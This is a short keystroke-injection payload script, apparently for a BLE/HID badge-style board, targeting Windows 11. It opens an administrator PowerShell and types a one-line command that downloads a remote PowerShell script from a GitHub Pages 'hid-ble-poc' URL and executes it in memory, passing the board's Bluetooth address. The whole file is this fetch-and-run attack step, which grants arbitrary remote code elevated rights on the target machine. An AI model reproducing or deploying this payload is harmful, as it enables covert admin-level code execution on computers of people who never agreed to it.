# Windows 11: elevated PowerShell (PairTool needs admin) -> fetch + run pair_win.ps1.
# {MAC} = this board's BLE address, substituted at runtime.
RunPowershellAdmin
DELAY 3000
STRING & ([scriptblock]::Create((New-Object Net.WebClient).DownloadString('https://whitewhidow.github.io/hid-ble-poc/pair_win.ps1'))) -MAC '{MAC}'
ENTER
